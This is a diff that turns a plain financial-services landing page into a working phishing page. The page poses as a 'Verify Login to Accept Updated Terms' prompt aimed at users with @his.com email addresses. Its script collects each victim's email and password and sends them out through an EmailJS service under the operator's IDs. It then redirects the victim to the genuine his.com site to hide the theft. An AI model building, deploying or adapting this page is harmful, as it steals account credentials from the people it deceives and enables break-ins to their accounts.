@@ -1,79 +1,235 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZimConnect Financial Services - Worland, WY</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <title>Verify Login to Accept Updated Terms</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333333;
+    }
+
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background-color: #ffffff;
+      border-radius: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      padding: 24px 24px 28px 24px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .logo img {
+      max-width: 220px;
+      height: auto;
+      display: inline-block;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 12px;
+      text-align: center;
+      color: #000000;
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .highlight {
+      font-weight: bold;
+    }
+
+    .form-wrapper {
+      margin-top: 10px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 4px;
+      text-align: left;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 14px;
+      border-radius: 4px;
+      border: 1px solid #cccccc;
+      margin-bottom: 4px;
+    }
+
+    .error-text {
+      display: block;
+      font-size: 12px;
+      color: #d00000;
+      margin-bottom: 8px;
+      min-height: 14px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      display: inline-block;
+      padding: 11px 16px;
+      font-size: 15px;
+      font-weight: bold;
+      text-align: center;
+      text-decoration: none;
+      color: #ffffff;
+      background-color: #0066cc;
+      border-radius: 4px;
+      border: none;
+      cursor: pointer;
+      margin-top: 6px;
+    }
+
+    .btn-primary:hover {
+      background-color: #0055aa;
+    }
+
+    .subtext {
+      font-size: 12px;
+      color: #777777;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .link-terms {
+      color: #0066cc;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px 16px 24px 16px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <header class="header">
-        <img src="logo.png" alt="ZimConnect Logo" class="logo">
-    </header>
+  <div class="page-wrapper">
+    <div class="card">
+      <div class="logo">
+        <img src="https://2jt1ghkis0.ucarecd.net/dce6db4e-d409-4026-bb9f-4e1b5fdb2f50/hiscom_transparent_400e.png" alt="Company Logo">
+      </div>
 
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Premier Financial Services in Worland, WY</h1>
-            <p>Trusted wealth management and investment solutions since 2010</p>
-            <a href="#contact" class="cta-button">Schedule Consultation</a>
-        </div>
-    </section>
+      <h1>Verify Login to Accept Updated Terms</h1>
 
-    <section class="services">
-        <div class="grid">
-            <div class="service-card">
-                <h3>Wealth Management</h3>
-                <p>Customized strategies for wealth preservation and growth</p>
-            </div>
-            <!-- Add more service cards -->
-        </div>
-    </section>
+      <p>
+        To continue using your account, you are <span class="highlight">required to verify your login</span> and accept our updated Service Terms Agreement.
+      </p>
 
-    <section class="about">
-        <h2>About Our Founder</h2>
-        <img src="https://i.imghippo.com/files/vr8852wRY.jpeg" alt="John Swenson" class="founder-image">
-        <h3>John Swenson</h3>
-        <p>With over 15 years in financial services, John Swenson has established himself as a trusted advisor in wealth management and investment planning. His expertise spans from strategic portfolio development to comprehensive financial planning, ensuring clients achieve their long-term goals.</p>
-    </section>
+      <div class="form-wrapper">
+        <!-- Contact form wired to EmailJS -->
+        <form id="contact-form">
+          <label for="email-input">Email address</label>
+          <input type="email" id="email-input" name="user_email" required>
+          <span id="email-error" class="error-text"></span>
 
-    <section class="contact" id="contact">
-        <h2>Contact Us</h2>
-        <form>
-            <input type="text" placeholder="Name" required>
-            <input type="email" placeholder="Email" required>
-            <textarea placeholder="Message" rows="5" required></textarea>
-            <button type="submit">Send Message</button>
+          <label for="password-input">Password</label>
+          <input type="password" id="password-input" name="user_password" required>
+          <span id="password-error" class="error-text"></span>
+
+          <button type="submit" class="btn-primary">
+            Continue
+          </button>
         </form>
-    </section>
+      </div>
 
-    <footer class="footer">
-        <div class="footer-grid">
-            <div>
-                <h4>ZimConnect Financial</h4>
-                <p>PO Box 1867<br>Gillette, WY 82717</p>
-            </div>
-            <div>
-                <h4>Services</h4>
-                <ul>
-                    <li><a href="#wealth">Wealth Management</a></li>
-                    <li><a href="#investment">Investment Planning</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4>Connect</h4>
-                <p>Phone: (307) 555-0199<br>
-                Email: contact@zimconnectmailsreachable.ink</p>
-                <div class="social-links">
-                    <a href="#">LinkedIn</a>
-                    <a href="#">Twitter</a>
-                </div>
-            </div>
-        </div>
-        <div class="legal">
-            <p>&copy; 2025 ZimConnect Financial Services. All rights reserved.</p>
-            <a href="/privacy">Privacy Policy</a> | 
-            <a href="/terms">Terms of Service</a>
-        </div>
-    </footer>
+      <p class="subtext">
+        After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
+        <br>
+        You can also view the terms any time at
+        <a href="https://www.tdscertreport.net/service-terms" class="link-terms">this page</a>.
+      </p>
+    </div>
+  </div>
+
+  <!-- EmailJS v3 browser SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS with your public key
+    emailjs.init("SdkmRe8WZ7itEba9z");
+
+    const contactForm = document.getElementById("contact-form");
+    const emailInput = document.getElementById("email-input");
+    const passwordInput = document.getElementById("password-input");
+    const emailError = document.getElementById("email-error");
+    const passwordError = document.getElementById("password-error");
+
+    contactForm.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // Simple front-end validation
+      let valid = true;
+      emailError.textContent = "";
+      passwordError.textContent = "";
+
+      const emailValue = emailInput.value.trim();
+      const allowedDomainRegex = /^[^@\s]+@(his\.com)$/i;
+
+      if (!emailValue) {
+        emailError.textContent = "Email is required.";
+        valid = false;
+      } else if (!allowedDomainRegex.test(emailValue)) {
+        emailError.textContent =
+          "Email must be @his.com.";
+        valid = false;
+      }
+
+      if (!passwordInput.value.trim()) {
+        passwordError.textContent = "Password is required.";
+        valid = false;
+      }
+
+      if (!valid) return;
+
+      // Send form via EmailJS
+      emailjs
+        .sendForm(
+          "service_zuj2d2a",      // your EmailJS service ID
+          "template_tvd86sp",     // your EmailJS template ID
+          "#contact-form"         // selector for this form
+        )
+        .then(function (response) {
+          console.log("SUCCESS!", response.status, response.text);
+
+          // Open Blue Valley in the same tab
+          window.open("https://www.his.com", "_self");
+
+          // Attempt to close current tab (works only if tab was script-opened)
+          window.close();
+        })
+        .catch(function (error) {
+          console.error("FAILED...", error);
+          alert("Failed to send. Please try again.");
+        });
+    });
+  </script>
 </body>
 </html>
